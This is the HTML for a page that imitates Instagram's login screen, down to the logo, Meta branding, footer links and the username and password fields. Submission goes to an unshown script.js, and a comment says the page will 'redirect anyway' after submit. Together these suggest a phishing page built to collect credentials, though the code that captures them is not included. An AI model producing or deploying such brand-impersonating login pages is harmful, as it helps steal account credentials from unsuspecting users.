<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
</head>
<body>
  <div class="login-card">
    <!-- Top language (English UK) -->
    <div class="top-lang">
      <i class="fas fa-globe"></i> English (UK)
    </div>

    <!-- Logo -->
    <div class="logo">
      <i class="fab fa-instagram"></i> Instagram
    </div>

    <!-- Login Form -->
    <form id="loginForm">
      <input type="text" id="username" placeholder="Username, email address or mobile number" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit" class="btn-login">Log in</button>
    </form>

    <!-- Forgot password -->
    <a href="#" class="forgot-link">Forgotten password?</a>

    <!-- OR Divider -->
    <div class="divider">
      <span>OR</span>
    </div>

    <!-- Create new account -->
    <p class="create-account">
      <a href="#">Create new account</a>
    </p>

    <!-- Meta footer -->
    <div class="meta-footer">
      <i class="fab fa-meta"></i> Meta
    </div>

    <!-- Bottom bar: only Meta and instagram.com as shown -->
    <div class="bottom-bar">
      <a href="#">Meta</a>
      <span class="dot">•</span>
      <a href="#">instagram.com</a>
    </div>

    <!-- Hidden response div (for errors, but we'll redirect anyway) -->
    <div id="responseMsg" class="response" style="display:none;"></div>
  </div>

  <script src="script.js"></script>
</body>
</html>
